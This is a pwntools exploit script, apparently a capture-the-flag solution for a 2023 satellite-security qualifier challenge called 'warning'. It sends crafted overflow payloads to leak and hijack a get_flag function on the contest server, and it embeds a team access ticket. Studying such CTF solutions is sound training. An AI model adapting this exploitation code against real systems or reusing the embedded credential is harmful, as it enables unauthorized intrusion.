#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host warning.quals2023-kah5Aiv9.satellitesabove.me --port 5300 warning_public/challenge/warning
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('warning_public/challenge/warning')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'warning.quals2023-kah5Aiv9.satellitesabove.me'
port = int(args.PORT or 5300)
ticket = b'ticket{yankee7041lima4:GPlMbJ-nYgbxGvmgdEAk78TXigjS1dHQcFeIEZuNsz18UCydXXAVQu4KvjwnEGnxhw}'

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    io.sendlineafter(b'Ticket please:\n', ticket)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

b = -0x100 + 5
c = 0x1000 + 10 + 0x100 - 20

io.sendlineafter(
    b'> ',
    flat({4: b, 8: c, 0x124: b}, length=0x500, word_size = 32)
)

io.sendlineafter(b'> ', b'')

io.recvuntil(b'get_flag: ')
get_flag = int(io.recvline(), 0)

io.success("get_flag: " + hex(get_flag))

io.sendline(b'')
io.sendline(flat([pack(get_flag) + b'\x00' * 2] * 100))

io.sendline(b'A' * 0x61)
io.sendline(b'A' * 0x61)
io.sendline(b'A' * 0x25)

io.interactive()

